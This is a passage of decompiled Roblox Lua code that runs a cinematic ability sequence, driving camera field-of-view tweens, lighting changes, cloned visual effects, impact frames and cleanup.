                                        end
                                        if v1212:IsA('BasePart') then
                                            local v1213 = u1183:FindFirstChild(v1212.Name)

                                            if v1213 then
                                                v1212.CFrame = v1213.CFrame
                                            end
                                        end
                                    end

                                    local v1214 = _Camera:WorldToScreenPoint((u1188.Head.CFrame * CFrame.new(0.2, 0.2, -0.5)).Position)

                                    u1190.EyeFlash.Position = UDim2.fromScale((v1214.X - 0.5) * _Viewport.AbsoluteSize.Y / _Viewport.AbsoluteSize.X + 0.5, (v1214.Y - 0.5) * _Viewport.AbsoluteSize.X / _Viewport.AbsoluteSize.Y + 0.5)
                                end)

                                task.delay(0.2, function()
                                    u1190.Flashup.Viewport.BackgroundColor3 = Color3.new(0, 0, 0)
                                    u1190.Flashup.Viewport.Viewport.ImageColor3 = Color3.fromRGB(20, 20, 20)

                                    u10:Create(u1190.Flashup.Viewport, TweenInfo.new(1, Enum.EasingStyle.Quad), {
                                        BackgroundColor3 = Color3.new(1, 1, 1),
                                    }):Play()
                                    u10:Create(u1190.Flashup.Viewport.Viewport, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {
                                        ImageColor3 = Color3.new(1, 1, 1),
                                    }):Play()

                                    u1190.EyeFlash.Visible = true

                                    u10:Create(u1190.EyeFlash, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {Rotation = 90}):Play()
                                    task.wait(0.2)

                                    u1190.EyeFlash.Visible = false

                                    task.wait(0.025)

                                    u1190.EyeFlash.Size = UDim2.fromScale(0.2, 0.2)
                                    u1190.EyeFlash.Visible = true

                                    task.wait(0.025)

                                    u1190.EyeFlash.Visible = false

                                    task.wait(0.025)

                                    u1190.EyeFlash.Size = UDim2.fromScale(0.25, 0.25)
                                    u1190.EyeFlash.Visible = true

                                    task.wait(0.05)

                                    u1190.EyeFlash.Visible = false

                                    task.wait(0.05)

                                    u1190.EyeFlash.Size = UDim2.fromScale(0.1, 0.1)
                                    u1190.EyeFlash.Visible = true

                                    task.wait(0.05)

                                    u1190.EyeFlash.Visible = false
                                end)

                                local v1216 = TweenInfo.new(2.5, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out)

                                u10:Create(u1190.Flashup, v1216, {
                                    Size = UDim2.new(1, 0, 0.3, 0),
                                }):Play()
                                u10:Create(_Camera, TweenInfo.new(2, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), {FieldOfView = 120}):Play()
                                task.wait(2)
                                u10:Create(_Camera, TweenInfo.new(1.7, Enum.EasingStyle.Exponential, Enum.EasingDirection.InOut), {FieldOfView = 70}):Play()
                                u10:Create(u1190.Flashup, TweenInfo.new(1, Enum.EasingStyle.Exponential, Enum.EasingDirection.In), {
                                    Size = UDim2.new(1, 0, 1, 0),
                                }):Play()
                                task.wait(1)
                                v1215:Disconnect()
                                task.delay(0.05, function()
                                    shared.SetCore(false)
                                    u1187(u1170, 1, 2, 0.07)

                                    u1170.Frame.Visible = true

                                    task.wait(0.05)

                                    u1170.Frame.Visible = false
                                end)

                                u1188.Parent = workspace

                                u1190:Destroy()

                                local v1217 = u1188
                                local v1218, v1219, v1220 = pairs(v1217:GetChildren())

                                while true do
                                    local v1221

                                    v1220, v1221 = v1218(v1219, v1220)

                                    if v1220 == nil then
                                        break
                                    end
                                    if v1221:IsA('BasePart') and v1221.Name ~= 'HumanoidRootPart' then
                                        v1221.Anchored = false
                                    end
                                end
                            end)
                            v1088.Speak(v1090, v1154[1])
                            task.wait(3)

                            v1130.TimePosition = 3
                            v1168.TimePosition = 3

                            local v1222 = u1189

                            u1189.Play(v1222, 0)

                            u1189.TimePosition = 3

                            local _HumanoidRootPart4 = u1188.HumanoidRootPart
                            local v1224 = CFrame.new(math.random(4000, 100000), 0, 0)

                            table.insert(v1149, u1188)

                            workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable

                            local u1225 = _HumanoidRootPart4
                            local u1226 = v1224
                            local u1227 = v1168

                            table.insert(v1149, (v1147.RenderStepped:Connect(function()
                                u1225.CFrame = u1226

                                if u1185 and u1185.Parent then
                                    u1185.RootPart.CFrame = u1226 * CFrame.new(0, -3, 0) * CFrame.Angles(0, 3.141592653589793, 0)

                                    local v1228 = math.ceil(u1227.TimePosition * 60)
                                    local v1229 = u1181.Camera.FOV:FindFirstChild((tonumber((math.ceil(v1228)))))

                                    workspace.CurrentCamera.CFrame = u1185.camera.CFrame

                                    if v1229 then
                                        workspace.CurrentCamera.FieldOfView = v1229.Value
                                    end
                                end
                            end)))

                            local u1230 = _UFW.ImpactFrames:Clone()

                            u1230.Parent = v1148.PlayerGui

                            local u1231 = _UFW.Flexworks:Clone()

                            u1231.Vignette.Visible = true
                            u1231.Parent = v1148.PlayerGui

                            table.insert(v1149, u1231)
                            table.insert(v1149, u1230)

                            local u1232 = _UFW.CloneArms:Clone()

                            u1232['Right Arm'].Color = u1188['Right Arm'].Color
                            u1232['Left Arm'].Color = u1188['Left Arm'].Color

                            local _RightArm = u1232['Right Arm']['Right Arm']
                            local _LeftArm = u1232['Left Arm']['Left Arm']
                            local v1235 = u1188
                            local v1236 = u1188.FindFirstChildWhichIsA(v1235, 'Shirt')

                            if v1236 then
                                v1236:Clone().Parent = u1232
                            end

                            u1232.Parent = u1188
                            _RightArm.Part0 = u1188['Right Arm']
                            _RightArm.Parent = u1188['Right Arm']
                            _LeftArm.Part0 = u1188['Left Arm']
                            _LeftArm.Parent = u1188['Left Arm']

                            table.insert(v1149, u1232)

                            local u1237 = _UFW.BG:Clone()
                            local v1238 = u1237

                            u1237.PivotTo(v1238, v1224 * CFrame.Angles(0, 1.5707963267948966, 0))

                            u1237.light2.SpotLight.Brightness = 20
                            u1237.Parent = workspace
                            game.Lighting.ClockTime = 22
                            u1237.Floor.Decal.Transparency = 0.99
                            u1237.Wall2.Decal.Transparency = 0.99

                            table.insert(v1149, u1237)

                            local _ColorCorrectionEffect = Instance.new('ColorCorrectionEffect')

                            _ColorCorrectionEffect.Brightness = -0.15
                            _ColorCorrectionEffect.Parent = game.Lighting

                            table.insert(v1149, _ColorCorrectionEffect)

                            local v1240 = {}

                            v1240.__index = v1240

                            local v1241 = u202
                            local _PlayAttachment = v1241.PlayAttachment
                            local _Maid = v1241.Maid
                            local _PlayTween = v1241.PlayTween
                            local _ = v1241.CamShake
                            local _ = v1241.PlayFlipBook
                            local _dtwait = v1241.dtwait
                            local _EFP = v1241.EFP
                            local _PlayMesh = v1241.PlayMesh
                            local _ = v1241.Impact
                            local _ = v1241.GlassLight
                            local _RaiseZIndex = v1241.RaiseZIndex
                            local _Able = v1241.Able
                            local _LifeScale = v1241.LifeScale
                            local _QuickFX = v1241.QuickFX
                            local _ = v1241.QuickWeld
                            local _ = v1241.Yield
                            local _ = v1241.ProcessPart
                            local _ = v1241.WeldObject
                            local u1252 = Random.new()
                            local _vfx = game.ReplicatedStorage.Resources.UFW.vfx
                            local u1254 = setmetatable({}, v1240)

                            u1254._maid = _Maid.new()

                            local u1255 = false

                            task.delay(10, function()
                                if not u1255 then
                                    u1255 = true

                                    u1254._maid:doCleaning()
                                end
                            end)

                            local _BG = u1237.BG
                            local u1257 = u1188
                            local _CurrentCamera3 = game.Workspace.CurrentCamera

                            local function u1276()
                                local v1259 = u1254._maid:give(_vfx['Right Arm']:Clone())
                                local v1260, v1261, v1262 = pairs(v1259:GetChildren())

                                while true do
                                    local v1263

                                    v1262, v1263 = v1260(v1261, v1262)

                                    if v1262 == nil then
                                        break
                                    end

                                    u1254._maid:give(v1263)

                                    v1263.Parent = u1257['Right Arm']

                                    game.Debris:AddItem(v1263, 0.6)
                                end

                                local _Highlight = Instance.new('Highlight')

                                _Highlight.FillTransparency = 1
                                _Highlight.FillColor = Color3.new(1, 1, 1)
                                _Highlight.OutlineTransparency = 0.5
                                _Highlight.OutlineColor = Color3.fromRGB(0, 0, 0)
                                _Highlight.Parent = u1257['Right Arm']

                                game.Debris:AddItem(_Highlight, 0.6)

                                local v1265 = u1254._maid:give(_vfx.ArmThing:Clone())
                                local _Weld = Instance.new('Weld')

                                _Weld.Part0 = v1265.PrimaryPart
                                _Weld.Part1 = u1257['Right Arm']
                                _Weld.Parent = v1265
                                _Weld.C0 = CFrame.new(0.8, 0, 0) * CFrame.Angles(0, 0, -1.5707963267948966)
                                v1265.Parent = _EFP

                                u10:Create(v1265.PrimaryPart.Mesh, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {
                                    Scale = v1265.End.Mesh.Scale,
                                }):Play()
                                u10:Create(_Weld, TweenInfo.new(0.5, Enum.EasingStyle.Sine), {
                                    C0 = _Weld.C0 * CFrame.new(0, -0.4, 0) * CFrame.Angles(0, 3.141592653589793, 0),
                                }):Play()

                                local v1267, v1268, v1269 = pairs(v1265.PrimaryPart:GetChildren())

                                while true do
                                    local v1270

                                    v1269, v1270 = v1267(v1268, v1269)

                                    if v1269 == nil then
                                        break
                                    end
                                    if v1270:IsA('Decal') then
                                        v1270.Transparency = 0

                                        u10:Create(v1270, TweenInfo.new(1, Enum.EasingStyle.Sine), {Transparency = 1}):Play()
                                    end
                                end

                                task.delay(0.2, function()
                                    local v1271, v1272, v1273 = pairs(u1257['Right Arm']:GetChildren())

                                    while true do
                                        local v1274

                                        v1273, v1274 = v1271(v1272, v1273)

                                        if v1273 == nil then
                                            break
                                        end

                                        v1274:IsA('ParticleEmitter')
                                    end
                                end)
                                task.delay(0.3, function()
                                    local v1275 = _vfx.Upwave:Clone()

                                    v1275:ScaleTo(0.1)
                                    _PlayMesh({
                                        Model = v1275,
                                        Anchor = u1257['Right Arm'].CFrame * CFrame.new(0, 0, 0) * CFrame.Angles(0, 0, 1.5707963267948966),
                                        Info = TweenInfo.new(0.3, Enum.EasingStyle.Quad),
                                    })
                                end)
                                _dtwait(0.5)
                                v1265:Destroy()
                            end

                            local u1277 = _UFW

                            local function u1294()
                                local function v1283()
                                    local u1278 = nil
                                    local u1279 = 1

                                    u1254.Impact = u1254._maid:give(u1277.Impact:Clone())
                                    u1254.Impact.Enabled = false
                                    u1254.Impact.Parent = _LocalPlayer3.PlayerGui

                                    local _Impact = u1254.Impact
                                    local u1281 = nil

                                    u1281 = shared.loop(function()
                                        local v1282 = _Impact:FindFirstChild((tostring(u1279)))

                                        if not v1282 then
                                            if _Impact and _Impact.Parent then
                                                _Impact:Destroy()
                                            end
                                            if u1278 and u1278.Parent then
                                                u1278:Destroy()
                                            end

                                            return u1281()
                                        end

                                        u1279 = u1279 + 1
                                        v1282.Size = UDim2.new(1, 0, 1, 0)

                                        if u1278 then
                                            u1278:Destroy()
                                        end

                                        u1278 = v1282
                                    end, 34)

                                    task.delay(5, function() end)
                                end

                                local v1284 = u1254._maid:give(_vfx.NextArm:Clone())
                                local v1285, v1286, v1287 = pairs(v1284:GetChildren())

                                while true do
                                    local v1288

                                    v1287, v1288 = v1285(v1286, v1287)

                                    if v1287 == nil then
                                        break
                                    end

                                    u1254._maid:give(v1288)

                                    v1288.Parent = u1257['Right Arm']

                                    game.Debris:AddItem(v1288, 0.6)
                                end

                                local v1289, v1290, v1291 = pairs(u1257['Right Arm']:GetDescendants())

                                while true do
                                    local v1292

                                    v1291, v1292 = v1289(v1290, v1291)

                                    if v1291 == nil then
                                        break
                                    end
                                    if v1292:IsA('Beam') then
                                        u10:Create(v1292, TweenInfo.new(0.3, Enum.EasingStyle.Sine), {TextureSpeed = 0}):Play()
                                    end
                                end

                                v1283()

                                local v1293 = _QuickFX({
                                    FX = _vfx.Break,
                                    Anchor = u1257['Right Arm'].CFrame * CFrame.new(0, -2, 0),
                                    Maid = u1254._maid,
                                })

                                _LifeScale({
                                    FX = v1293,
                                    Scale = 0.5,
                                })
                                _PlayAttachment(v1293)
                            end
                            local function u1309()
                                local v1295 = _QuickFX({
                                    FX = _vfx.FinalCrack,
                                    Anchor = u1237.KJWallBreak.PrimaryPart.CFrame * CFrame.Angles(1.5707963267948966, 0, 0),
                                    Maid = u1254._maid,
                                })
                                local v1296, v1297, v1298 = pairs(v1295:GetDescendants())

                                while true do
                                    local v1299

                                    v1298, v1299 = v1296(v1297, v1298)

                                    if v1298 == nil then
                                        break
                                    end
                                    if v1299:IsA('Beam') then
                                        u10:Create(v1299, TweenInfo.new(0.4, Enum.EasingStyle.Sine), {TextureSpeed = 0}):Play()
                                    end
                                end

                                _dtwait(0.1);
                                (function()
                                    local u1300 = nil
                                    local u1301 = 1

                                    u1254.Impact = u1254._maid:give(u1277.Impact3:Clone())
                                    u1254.Impact.Enabled = false
                                    u1254.Impact.Parent = _LocalPlayer3.PlayerGui

                                    local _Impact2 = u1254.Impact
                                    local u1303 = nil

                                    u1303 = shared.loop(function()
                                        local v1304 = _Impact2:FindFirstChild((tostring(u1301)))

                                        if not v1304 then
                                            if _Impact2 and _Impact2.Parent then
                                                _Impact2:Destroy()
                                            end
                                            if u1300 and u1300.Parent then
                                                u1300:Destroy()
                                            end

                                            return u1303()
                                        end

                                        u1301 = u1301 + 1
                                        v1304.Size = UDim2.new(1, 0, 1, 0)

                                        if u1300 then
                                            u1300:Destroy()
                                        end

                                        u1300 = v1304
                                    end, 34)

                                    task.delay(5, function() end)
                                end)()

                                u1254.Impact1 = u1254._maid:give(u1277:FindFirstChild('1'):Clone())
                                u1254.Impact1.Parent = game.Lighting

                                _dtwait(0.05)
                                u1254.Impact1:Destroy()

                                u1254.Impact2 = u1254._maid:give(u1277:FindFirstChild('2'):Clone())
                                u1254.Impact2.Parent = game.Lighting

                                _dtwait(0.05)
                                u1254.Impact2:Destroy()
                                _dtwait(0.1)

                                local v1305, v1306, v1307 = pairs(v1295:GetDescendants())

                                while true do
                                    local v1308

                                    v1307, v1308 = v1305(v1306, v1307)

                                    if v1307 == nil then
                                        break
                                    end
                                    if v1308:IsA('Beam') then
                                        _PlayTween(v1308, {
                                            Time = 0.1,
                                            EasingStyle = 'Sine',
                                            Goal = {
                                                Transparency = NumberSequence.new({
                                                    NumberSequenceKeypoint.new(0, 1),
                                                    NumberSequenceKeypoint.new(1, 1),
                                                }),
                                            },
                                        })
                                        game.Debris:AddItem(v1308, 0.1)
                                    end
                                end
                            end
                            local function u1329()
                                u1231.Flexworks.Visible = false

                                task.spawn(function()
                                    local v1310 = CFrame.new(0, 0, -20) * CFrame.Angles(0, 3.141592653589793, 0)
                                    local v1311 = _QuickFX({
                                        FX = _vfx.BeamCam,
                                        Anchor = _CurrentCamera3.CFrame * v1310 * CFrame.Angles(0, 0, 0),
                                        Maid = u1254._maid,
                                    })
                                    local v1312, v1313, v1314 = pairs(v1311:GetDescendants())

                                    while true do
                                        local v1315

                                        v1314, v1315 = v1312(v1313, v1314)

                                        if v1314 == nil then
                                            break
                                        end
                                        if v1315:IsA('Beam') then
                                            local _Transparency2 = v1315.Transparency

                                            v1315.Transparency = NumberSequence.new({
                                                NumberSequenceKeypoint.new(0, 1),
                                                NumberSequenceKeypoint.new(1, 1),
                                            })

                                            local v1317 = {
                                                Time = 2,
                                                EasingStyle = 'Sine',
                                                Goal = {Transparency = _Transparency2},
                                            }

                                            _PlayTween(v1315, v1317)

                                            v1315.TextureSpeed = 0

                                            u10:Create(v1315, TweenInfo.new(3, Enum.EasingStyle.Exponential), {TextureSpeed = 8}):Play()
                                        end
                                    end

                                    local v1318 = tick()

                                    while tick() - v1318 < 1 do
                                        v1311:setPrimaryPartCFrame(_CurrentCamera3.CFrame * v1310)
                                        _dtwait(0.02)
                                    end

                                    local v1319, v1320, v1321 = pairs(v1311:GetDescendants())

                                    while true do
                                        local v1322

                                        v1321, v1322 = v1319(v1320, v1321)

                                        if v1321 == nil then
                                            break
                                        end
                                        if v1322:IsA('Beam') then
                                            local v1323 = _PlayTween
                                            local v1324 = {
                                                Time = 0.15,
                                                EasingStyle = 'Sine',
                                                Goal = {
                                                    Transparency = NumberSequence.new({
                                                        NumberSequenceKeypoint.new(0, 1),
                                                        NumberSequenceKeypoint.new(1, 1),
                                                    }),
                                                },
                                            }

                                            v1323(v1322, v1324)
                                            game.Debris:AddItem(v1322, 0.15)
                                        end
                                    end
                                end)
                                task.spawn(function()
                                    for _ = 1, 8 do
                                        local v1325 = _QuickFX
                                        local v1326 = {
                                            FX = _vfx.TP,
                                            Maid = u1254._maid,
                                        }
                                        local _, v1327, _ = u1257.HumanoidRootPart.CFrame:ToOrientation()

                                        v1326.Anchor = CFrame.new(u1257.Torso.Position) * CFrame.Angles(0, v1327, 0) * CFrame.Angles(0, 0, 1.5707963267948966)

                                        local v1328 = v1325(v1326)

                                        _LifeScale({
                                            FX = v1328,
                                            Scale = 0.4,
                                        })
                                        _RaiseZIndex({
                                            FX = v1328,
                                            Count = 1,
                                        })
                                        _PlayAttachment(v1328)
                                        _dtwait(0.04)
                                    end
                                end)
                                u10:Create(u1231.Black, TweenInfo.new(2, Enum.EasingStyle.Quad), {
                                    Size = UDim2.new(1.35, 0, 1.35, 0),
                                }):Play()
                                _dtwait(0.4)
                                _PlayAttachment((_QuickFX({
                                    FX = _vfx.Glint,
                                    Anchor = _CurrentCamera3.CFrame * CFrame.new(0, 0, -10),
                                    Maid = u1254._maid,
                                })))
                            end
                            local function u1358()
                                local v1330 = _vfx.UpTime:Clone()

                                v1330:ScaleTo(0.2)
                                _PlayMesh({
                                    Model = v1330,
                                    T = 0,
                                    Anchor = _CurrentCamera3.CFrame * CFrame.new(0, 0, -10) * CFrame.Angles(0, 1.5707963267948966, 0),
                                    Info = TweenInfo.new(0.2, Enum.EasingStyle.Exponential),
                                })

                                for v1331 = 1, 5 do
                                    local v1332 = _vfx.Upwave:Clone()

                                    v1332:ScaleTo(0.2 * (v1331 * 0.4))
                                    _PlayMesh({
                                        Model = v1332,
                                        T = 0,
                                        Anchor = _CurrentCamera3.CFrame * CFrame.new(0, 0, -10) * CFrame.Angles(0, 1.5707963267948966, 0),
                                        Info = TweenInfo.new(0.3 + v1331 / 10, Enum.EasingStyle.Exponential),
                                    })

                                    local v1333 = _vfx.UpTimeReverse:Clone()

                                    v1333:ScaleTo(0.2 * (v1331 * 0.4))
                                    _PlayMesh({
                                        Model = v1333,
                                        T = 0,
                                        EndT = 0,
                                        Anchor = _CurrentCamera3.CFrame * CFrame.new(0, 0, -10) * CFrame.Angles(0, 1.5707963267948966, 0),
                                        Info = TweenInfo.new(0.5 + v1331 / 10, Enum.EasingStyle.Exponential),
                                    })
                                    _dtwait(0.04)
                                end

                                local function v1356()
                                    local v1334 = CFrame.new(0, -7, -150) * CFrame.Angles(0, 3.141592653589793, 0)
                                    local v1335 = _CurrentCamera3.CFrame * v1334
                                    local u1336 = u1254._maid:give(_vfx.ThingStart:Clone())

                                    u1336:PivotTo(v1335)

                                    u1336.Parent = _EFP
                                    _BG.Color = Color3.new(0.117647, 0.117647, 0.117647)

                                    game.Debris:AddItem(u1336, 2)

                                    local v1337 = u1254._maid:give(_vfx.ThingMiddle:Clone())

                                    v1337:PivotTo(v1335)

                                    v1337.Parent = _EFP

                                    local v1338, v1339, v1340 = pairs(u1336:GetChildren())

                                    while true do
                                        local v1341, v1342 = v1338(v1339, v1340)

                                        if v1341 == nil then
                                            break
                                        end

                                        v1340 = v1341

                                        local v1343 = v1337:FindFirstChild(v1342.Name)

                                        if v1343 then
                                            u10:Create(v1342, TweenInfo.new(0.7, Enum.EasingStyle.Sine), {
                                                Size = v1343.Size,
                                                CFrame = v1343.CFrame,
                                            }):Play()
                                        end
                                    end

                                    _dtwait(0.7)

                                    local v1344 = u1254._maid:give(_vfx.ThingEnd:Clone())

                                    v1344:PivotTo(v1335)

                                    v1344.Parent = _EFP

                                    task.spawn(function()
                                        local v1345 = tick()

                                        while tick() - v1345 < 2 do
                                            if u1336:FindFirstChild('star') then
                                                u1336.star.CFrame = u1336.star.CFrame * CFrame.Angles(0, 0, 0.08726646259971647)
                                            end

                                            _dtwait(0.01)
                                        end
                                    end)

                                    local v1346, v1347, v1348 = pairs(u1336:GetChildren())

                                    while true do
                                        local v1349

                                        v1348, v1349 = v1346(v1347, v1348)

                                        if v1348 == nil then
                                            break
                                        end

                                        local v1350 = v1344:FindFirstChild(v1349.Name)

                                        if v1350 and not v1349.Name:find('SH') and not v1349.Name:find('sh') then
                                            if v1349.Name ~= 'star' then
                                                u10:Create(v1349, TweenInfo.new(3, Enum.EasingStyle.Sine), {
                                                    Size = v1350.Size,
                                                    CFrame = v1350.CFrame,
                                                }):Play()
                                            else
                                                u10:Create(v1349, TweenInfo.new(3, Enum.EasingStyle.Sine), {
                                                    Size = v1350.Size,
                                                }):Play()
                                            end
                                        end
                                    end

                                    _dtwait(0.4)

                                    local u1351 = _QuickFX({
                                        FX = _vfx.Particles,
                                        Maid = u1254._maid,
                                        Anchor = _CurrentCamera3.CFrame * CFrame.new(0, 0, -20),
                                    })

                                    _Able({
                                        FX = u1351,
                                        On = true,
                                    })

                                    local u1352 = tick()

                                    task.spawn(function()
                                        while tick() - u1352 < 1.5 do
                                            u1351:PivotTo(_CurrentCamera3.CFrame * CFrame.new(0, 0, -20))
                                            _dtwait(0.02)
                                        end

                                        u1351:Destroy()
                                    end)
                                    _dtwait(0.3)

                                    local v1353 = u1254._maid:give(Instance.new('ColorCorrectionEffect'))

                                    v1353.Parent = game.Lighting

                                    u10:Create(v1353, TweenInfo.new(0.3, Enum.EasingStyle.Sine), {Brightness = 1}):Play()

                                    local _spawn = task.spawn
                                    local u1355 = true

                                    _spawn(function()
                                        if u1355 then
                                            u10:Create(game.Lighting, TweenInfo.new(1.827, Enum.EasingStyle.Quad), {
                                                Brightness = 0,
                                                Ambient = Color3.fromRGB(0, 0, 0),
                                                OutdoorAmbient = Color3.fromRGB(25, 25, 25),
                                            }):Play()
                                            u10:Create(game.Lighting, TweenInfo.new(0.65, Enum.EasingStyle.Quad), {ClockTime = 0}):Play()
                                        else
                                            u10:Create(game.Lighting, TweenInfo.new(1.827, Enum.EasingStyle.Quad), {
                                                Brightness = 2,
                                                Ambient = Color3.fromRGB(138, 138, 138),
                                                OutdoorAmbient = Color3.fromRGB(70, 70, 70),
                                            }):Play()
                                            u10:Create(game.Lighting, TweenInfo.new(0.65, Enum.EasingStyle.Quad), {ClockTime = 13}):Play()
                                        end
                                    end)
                                    _dtwait(0.3)
                                    u1336:Destroy()
                                    v1337:Destroy()
                                    v1344:Destroy()
                                    _Able({
                                        FX = u1351,
                                        On = false,
                                    })
                                    u10:Create(v1353, TweenInfo.new(0.1, Enum.EasingStyle.Sine), {Brightness = 0}):Play()
                                end

                                local v1357 = _BG

                                v1357.Size = v1357.Size * 6

                                _dtwait(0.1)
                                v1356()
                            end
                            local function u1371()
                                local u1359 = CFrame.new(0, -3.5, -80) * CFrame.Angles(0, 0, 0)
                                local u1360 = _QuickFX({
                                    FX = _vfx.Space,
                                    Maid = u1254._maid,
                                    Anchor = _CurrentCamera3.CFrame * u1359,
                                })

                                _Able({
                                    FX = u1360,
                                    On = false,
                                })

                                local v1361, v1362, v1363 = pairs(u1360:GetDescendants())

                                while true do
                                    local u1364

                                    v1363, u1364 = v1361(v1362, v1363)

                                    if v1363 == nil then
                                        break
                                    end
                                    if u1364.Name ~= 'A1' then
                                        if u1364.Name ~= 'Glint' then
                                            if u1364:IsA('Beam') then
                                                local _Width0 = u1364.Width0
                                                local _Width1 = u1364.Width1
                                                local _TextureSpeed = u1364.TextureSpeed

                                                u1364.Width0 = u1364.Width0 * 0.001
                                                u1364.Width1 = u1364.Width1 * 0.001
                                                u1364.TextureSpeed = -_TextureSpeed * 0.5

                                                u10:Create(u1364, TweenInfo.new(3, Enum.EasingStyle.Sine), {
                                                    Width0 = _Width0,
                                                    Width1 = _Width1,
                                                }):Play()
                                                task.delay(0.4, function()
                                                    u10:Create(u1364, TweenInfo.new(4, Enum.EasingStyle.Sine), {
                                                        TextureSpeed = _TextureSpeed * 2,
                                                    }):Play()
                                                    _Able({
                                                        FX = u1360,
                                                        On = true,
                                                    })
                                                end)
                                            end
                                        else
                                            local _CFrame6 = u1364.CFrame

                                            u1364.CFrame = u1364.CFrame * CFrame.new(0, 0, -u1364.CFrame.Position.Z)

                                            u10:Create(u1364, TweenInfo.new(5, Enum.EasingStyle.Sine), {CFrame = _CFrame6}):Play()
                                        end
                                    else
                                        local _CFrame7 = u1364.CFrame

                                        u1364.CFrame = u1364.CFrame * CFrame.new(-u1364.CFrame.Position.Y * -50, 0, -u1364.CFrame.Position.Z)

                                        u10:Create(u1364, TweenInfo.new(1, Enum.EasingStyle.Sine), {CFrame = _CFrame7}):Play()
                                    end
                                end

                                local u1370 = tick()

                                task.spawn(function()
                                    while tick() - u1370 < 2.5 do
                                        u1360:PivotTo(_CurrentCamera3.CFrame * u1359)
                                        _dtwait(0.02)
                                    end

                                    u1360:Destroy()
                                end)

                                return u1360
                            end
                            local function u1390()
                                local _spawn2 = task.spawn
                                local u1373 = true

                                _spawn2(function()
                                    if u1373 then
                                        u10:Create(game.Lighting, TweenInfo.new(1.827, Enum.EasingStyle.Quad), {
                                            Brightness = 0,
                                            Ambient = Color3.fromRGB(0, 0, 0),
                                            OutdoorAmbient = Color3.fromRGB(25, 25, 25),
                                        }):Play()
                                        u10:Create(game.Lighting, TweenInfo.new(0.65, Enum.EasingStyle.Quad), {ClockTime = 0}):Play()
                                    else
                                        u10:Create(game.Lighting, TweenInfo.new(1.827, Enum.EasingStyle.Quad), {
                                            Brightness = 2,
                                            Ambient = Color3.fromRGB(138, 138, 138),
                                            OutdoorAmbient = Color3.fromRGB(70, 70, 70),
                                        }):Play()
                                        u10:Create(game.Lighting, TweenInfo.new(0.65, Enum.EasingStyle.Quad), {ClockTime = 13}):Play()
                                    end
                                end)
                                u1237:Destroy()

                                local u1374 = tick()
                                local u1375 = _QuickFX({
                                    FX = _vfx.Space1,
                                    Anchor = _CurrentCamera3.CFrame * CFrame.new(0, 0, -100) * CFrame.Angles(0, 1.5707963267948966, 0),
                                    Maid = u1254._maid,
                                })

                                task.spawn(function()
                                    local v1376 = u1375
                                    local v1377, v1378, v1379 = pairs(v1376:GetDescendants())

                                    while true do
                                        local v1380

                                        v1379, v1380 = v1377(v1378, v1379)

                                        if v1379 == nil then
                                            break
                                        end
                                        if v1380.Name:find('smoke') then
                                            u10:Create(v1380, TweenInfo.new(0.6, Enum.EasingStyle.Sine), {TimeScale = 0.05}):Play()
                                            v1380:Emit(10)
                                        elseif v1380:IsA('ParticleEmitter') then
                                            v1380:Emit(5)
                                        end
                                    end

                                    task.spawn(function()
                                        for _ = 1, 10 do
                                            local v1381, v1382, v1383 = pairs(u1375.Attachment:GetChildren())

                                            while true do
                                                local v1384

                                                v1383, v1384 = v1381(v1382, v1383)

                                                if v1383 == nil then
                                                    break
                                                end
                                                if v1384.Name == 'star' then
                                                    v1384:Emit(1)
                                                end
                                            end

                                            _dtwait(0.2)
                                        end
                                    end)
                                end)
                                _LifeScale({
                                    FX = u1375,
                                    Scale = 0.5,
                                })
                                _LifeScale({
                                    FX = u1375.Attachment,
                                    Scale = 2,
                                })
                                _RaiseZIndex({
                                    FX = u1375.Attachment,
                                    Count = 5,
                                })
                                task.spawn(function()
                                    while tick() - u1374 < 1.5 do
                                        if tick() - u1374 >= 1 then
                                            u1375.CFrame = _CurrentCamera3.CFrame * CFrame.new(0, 0, -100)
                                        else
                                            u1375.CFrame = _CurrentCamera3.CFrame * CFrame.new(0, 0, -222500)
                                        end

                                        _dtwait(0.01)
                                    end
                                end)
                                _dtwait(2.5)

                                local v1385 = u1375

                                u1375.Destroy(v1385)

                                local v1386 = u1371()
                                local u1387 = _QuickFX({
                                    FX = _vfx.Scene,
                                    Anchor = _CurrentCamera3.CFrame * CFrame.new(0, 0, -10000) * CFrame.Angles(0, 1.5707963267948966, 0),
                                    Maid = u1254._maid,
                                })

                                _dtwait(2.15)
                                v1386:Destroy()

                                local u1388 = tick()

                                task.spawn(function()
                                    local v1389 = 0

                                    while tick() - u1388 < 1.5 do
                                        v1389 = v1389 + 2

                                        u1387:PivotTo(_CurrentCamera3.CFrame * CFrame.new(0, -10, -450) * CFrame.Angles(0.6108652381980153, 1.5707963267948966, 0) * CFrame.Angles(0, 0, 0))
                                        _dtwait(0.01)
                                    end
                                end)
                                game.Debris:AddItem(u1387, 3)
                            end

                            local _ = v1090
                            local u1391 = _HumanoidRootPart4

                            local function u1466()
                                local _spawn3 = task.spawn
                                local u1393 = false

                                _spawn3(function()
                                    if u1393 then
                                        u10:Create(game.Lighting, TweenInfo.new(1.827, Enum.EasingStyle.Quad), {
                                            Brightness = 0,
                                            Ambient = Color3.fromRGB(0, 0, 0),
                                            OutdoorAmbient = Color3.fromRGB(25, 25, 25),
                                        }):Play()
                                        u10:Create(game.Lighting, TweenInfo.new(0.65, Enum.EasingStyle.Quad), {ClockTime = 0}):Play()
                                    else
                                        u10:Create(game.Lighting, TweenInfo.new(1.827, Enum.EasingStyle.Quad), {
                                            Brightness = 2,
                                            Ambient = Color3.fromRGB(138, 138, 138),
                                            OutdoorAmbient = Color3.fromRGB(70, 70, 70),
                                        }):Play()
                                        u10:Create(game.Lighting, TweenInfo.new(0.65, Enum.EasingStyle.Quad), {ClockTime = 13}):Play()
                                    end
                                end)

                                local v1394 = CFrame.new(0, 0, -100) * CFrame.Angles(1.5707963267948966, 0, 0)
                                local u1395 = _QuickFX({
                                    FX = _vfx.Pillar,
                                    Maid = u1254._maid,
                                    Anchor = _CurrentCamera3.CFrame * v1394,
                                })
                                local u1396 = u1108

                                u1396.Name = _LocalPlayer3.Name .. 'Rig'

                                game.Debris:AddItem(u1396, 10)

                                local u1397 = u1391.CFrame * CFrame.new(0.265625, -4.92593479, -57.606514)
                                local u1398 = u1254._maid:give(Instance.new('NumberValue'))

                                u1398.Value = -208

                                u10:Create(u1398, TweenInfo.new(3, Enum.EasingStyle.Sine), {Value = 0}):Play()

